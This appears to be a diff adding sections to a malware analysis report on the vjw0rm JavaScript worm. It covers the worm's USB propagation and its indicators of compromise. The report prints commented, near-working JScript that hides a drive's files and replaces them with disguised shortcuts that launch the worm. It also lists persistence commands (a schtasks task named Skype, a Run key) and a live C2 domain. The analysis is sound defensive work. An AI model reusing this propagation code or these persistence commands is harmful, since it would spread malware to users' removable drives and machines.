@@ -280,4 +280,123 @@
    Everytime the sample tries to contact the C2, it also scan the instances of Win32_LogicalDisk
    in order to find a USB device and copy itself on it. The sample is copied with the =hidden= and =system= attributes,
    which means it is suposed to be invisible and cannot be deleted, depending on the rights associated with the execution.
-   Then, the sample scan for the content 
+   Then, the sample scans the content of the root directory of the usb device and will create an lnk file for each present 
+   file and folder. those lnk files are trying to look like the initial files on the device, i.e. it will have the same name and icon.
+   The lnk file will launch the hidden malware, then open the corresponding file or folder, trying to make the actin looks like 
+   everything is ok.
+
+   Creating lnk for folder:
+   #+begin_src js
+     for (;!enumFolders.atEnd();enumFolders.moveNext()) {
+         var folder = enumFolders.item(); //gf
+         folder.attributes=2+4;
+         // Put scriptName in double quotes
+         ScriptName = ScriptName.replace(" ", "\"" + " " + "\"");
+         var folderName = folder.name; // n
+         // Put FolderName in double quotes
+         folderName = folderName.replace(" ", "\"" + " " + "\"");
+         // Creates a shortcut on removable media with folderName
+         var shortCut = shell.CreateShortCut(DrivePath + folder.name + ".lnk"); // sr
+         // 7 means windows is minimized and activates the next top level windows
+         shortCut.WindowStyle = 7;
+         // Makes the shortcut open cmd.exe, then explorer to make it look like nothing fishy happened
+         shortCut.TargetPath  = "cmd.exe";
+         shortCut.Arguments = "/c start " + ScriptName + "&start explorer " + folderName + "&exit";
+         var defaultFolderIconKey = "HKLM\\software\\classes\\folder\\defaulticon\\";
+         var defaultFolderIconPath = shell.RegRead(defaultFolderIconKey); //fic
+         // default WshShortcut.iconLocation is ",0" where 0 is an index
+         var iconLocation = shortCut.IconLocation; //ci
+         var sci = ",";
+         if (iconLocation.indexOf(sci) !== -1) {
+             shortCut.IconLocation = defaultFolderIconPath;
+         } else {
+             shortCut.IconLocation = folder.Path;
+         }
+         shortCut.Save();
+     }
+   #+end_src
+
+   Creating lnk for files
+   #+begin_src js
+     var files = new Enumerator(FileSystem.GetFolder(DrivePath).Files);
+     // Enumerates files on usb device
+     for (;!files.atEnd();files.moveNext()) {
+         var file = files.item(); // gfi
+         var dot = ".";
+         var lnk = "lnk";
+         // If filename contains ".lnk"
+         if (file.name.indexOf(dot) !== -1) {
+             if (file.name.indexOf(lnk) !== -1) {
+             } else {
+                 // verifies that current file is not the actual script
+                 if (file.name !== ScriptName) {
+                     // sets hidden and system flags
+                     file.attributes=2+4;
+                     var fileName = file.name;
+                     fileName = fileName.replace(" ", "\"" + " " + "\"");
+                     ScriptName = ScriptName.replace(" ", "\"" + " " + "\"");
+                     // Creates a shortcut on the usb drive for each file present. Same technique as with the directory
+                     // Uses the same icon in order to hide from and confuse users.
+                     var shortCut = shell.CreateShortCut(DrivePath + file.name + ".lnk"); //shr
+                     shortCut.WindowStyle=7;
+                     shortCut.TargetPath = "cmd.exe";
+                     shortCut.Arguments = "/c start " + ScriptName + "&start " + fileName + "&exit";
+                     var fileNameSplit = currentFile.name.split("."); // sgf
+                     // reads the class default value which often contains ${extension}File
+                     var defaultName = shell.RegRead("HKLM\\software\\classes\\" + "." + fileNameSplit[fileNameSplit.length -1] /* extension */ + "\\"); // fvi
+                     // Get the defaulticon for the file type
+                     var icon = shell.RegRead("HKLM\\software\\classes\\" + defaultName + "\\defaulticon" + "\\"); //fvi2
+                     var iconLocation = shr.IconLocation; // ci
+                     var sci = ",";
+                     // default WshShortcut.iconLocation is ",0" where 0 is an index
+                     if (iconLocation.indexOf(sci) !== -1) {
+                         shortCut.IconLocation = icon;
+                     } else {
+                         shortCut.IconLocation = file.Path;
+                     }
+                     shortCut.Save();
+                 }
+             }
+         }
+     }
+   #+end_src
+* IOC
+  When vjw0rm is launched, it will leave the following traces.
+** Registry
+  The sample creates the folowing registry keys:
+  - HKCU\\vjw0rm: \\
+    A REG_SZ indicating if the sample is in a root directory
+  - HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\URCWXKQC01: \\
+    A REG_SZ indicating that the program should be run on every user logon
+** Scheduled task
+   The sample creates a scheduled task named skype with the command
+   =Schtasks /create /sc minute /mo 30 /tn Skype /tr C:\Users\${USER}\AppData\Local\Temp\scan_234724767987497437257751775751.js=
+   
+   here are the details of the scheduled task
+   #+begin_src powershell
+     PS C:\Users\test\Desktop> Get-ScheduledTask -TaskName "skype" | % { @{
+     >> Name = $_.TaskName
+     >> Path = $_.TaskPath
+     >> Command = $_.Actions.Execute
+     >> Triggers = $_.Triggers.Repetition.Interval
+     >> }}
+
+     Name                           Value
+     ----                           -----
+     Path                           \
+     Command                        C:\Users\test\AppData\Local\Temp\scan_234724767987497437257751775751.js
+     Name                           Skype
+     Trigger                        PT30M
+   #+end_src
+
+** File Creation
+   The sample will create a copy of itself in the user temps folder at =C:\Users\${USER}\AppData\Local\Temp\scan_234724767987497437257751775751.js=
+   Other files might be created in response to some C2 command, but the absence of response from said C2 did not help.
+
+** Network
+   The sample will try to contact =postventa-vodafone2006.duckdns.org= on port 1993, the protocol is http
+
+** Process
+   The sample will execute the following programs:
+   - schtasks /create /sc minute /mo 30 /tn Skype /tr "C:\Users\${USER}\AppData\Local\Temp\scan_234724767987497437257751775751.js"
+   - wscript //B "scan_234724767987497437257751775751.js"
